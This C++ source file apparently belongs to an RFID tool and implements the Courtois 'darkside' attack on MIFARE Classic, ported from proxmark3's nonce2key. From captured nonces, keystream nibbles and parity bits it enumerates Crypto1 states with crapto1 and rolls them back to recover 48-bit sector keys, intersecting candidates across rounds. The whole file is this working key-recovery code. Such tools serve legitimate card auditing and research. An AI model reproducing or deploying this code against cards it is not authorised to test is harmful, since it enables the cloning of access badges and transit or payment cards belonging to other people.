// DARKSIDE solver implementation. Ports proxmark3's nonce2key (Courtois "dark side" attack):
// build ks3x[8] and par[8][8] from the accumulated NACK keystream nibbles and parity bytes,
// run the common-prefix attack (lfsr_prefix_ks + lfsr_common_prefix) to enumerate the cipher
// states that are consistent with every observed variation, then roll each state back over the
// tag nonce (uid ^ nt) to de-obfuscate the initial LFSR = the 48-bit key. De-duped across the
// returned states and, when several rounds are supplied, intersected between rounds.
//
// Reference: RfidResearchGroup/proxmark3 tools/mfc/card_only/nonce2key.c and
// client/src/mifare/mifarehost.c (mf_dark_side). Only the ALGORITHM is ported, not the I/O.

#include "signal/darkside.h"

#include <algorithm>
#include <cstdlib>
#include <iterator>
#include <vector>

extern "C" {
#include "signal/crapto1/crapto1.h"
}

namespace onyx {

// Recover every candidate key implied by a single acquire round, appending to `out`.
static void recover_round(const ChDarksideRound& r, std::vector<uint64_t>& out) {
  uint8_t ks3x[8];
  uint8_t par[8][8];
  uint32_t no_par = 1;  // "parity is all zero" special case (card NACKs on every auth)

  for (int i = 0; i < 8; i++) {
    ks3x[i] = r.ks[i] & 0x0f;
    if (r.par[i]) no_par = 0;
    for (int j = 0; j < 8; j++) {
      par[i][j] = (r.par[i] >> j) & 1;  // LSB-first, matching proxmark's par[..][i]=(bt>>i)&1
    }
  }

  // Reset the three low significant bits of the reader nonce: those are exactly the bits the
  // attack varies (nt_diff is re-applied as `pfx | c<<5` inside lfsr_common_prefix). rr = 0.
  uint32_t pfx = r.nr & 0xffffff1f;
  uint32_t rr = 0;

  struct Crypto1State* states = lfsr_common_prefix(pfx, rr, ks3x, par, no_par);
  if (!states) return;

  for (struct Crypto1State* p = states; (p->odd | p->even) != 0; ++p) {
    struct Crypto1State t = *p;  // rollback mutates the state, so work on a copy
    lfsr_rollback_word(&t, r.uid ^ r.nt, 0);
    uint64_t key = 0;
    crypto1_get_lfsr(&t, &key);
    out.push_back(key);
  }
  free(states);
}

static void sort_unique(std::vector<uint64_t>& v) {
  std::sort(v.begin(), v.end());
  v.erase(std::unique(v.begin(), v.end()), v.end());
}

int darkside_recover(const ChDarksideRound* rounds, int nrounds, uint64_t* keys_out, int max_keys) {
  if (!rounds || nrounds < 1 || !keys_out || max_keys < 1) return 0;

  std::vector<uint64_t> acc;
  recover_round(rounds[0], acc);
  sort_unique(acc);

  // Additional rounds only keep keys consistent with every round (set intersection). Essential
  // for the all-zero-parity variant, where one round alone yields an enormous candidate list.
  for (int i = 1; i < nrounds && !acc.empty(); ++i) {
    std::vector<uint64_t> cur;
    recover_round(rounds[i], cur);
    sort_unique(cur);
    std::vector<uint64_t> inter;
    std::set_intersection(acc.begin(), acc.end(), cur.begin(), cur.end(),
                          std::back_inserter(inter));
    acc.swap(inter);
  }

  int n = static_cast<int>(acc.size());
  if (n > max_keys) n = max_keys;
  for (int i = 0; i < n; i++) keys_out[i] = acc[i];
  return n;
}

}  // namespace onyx
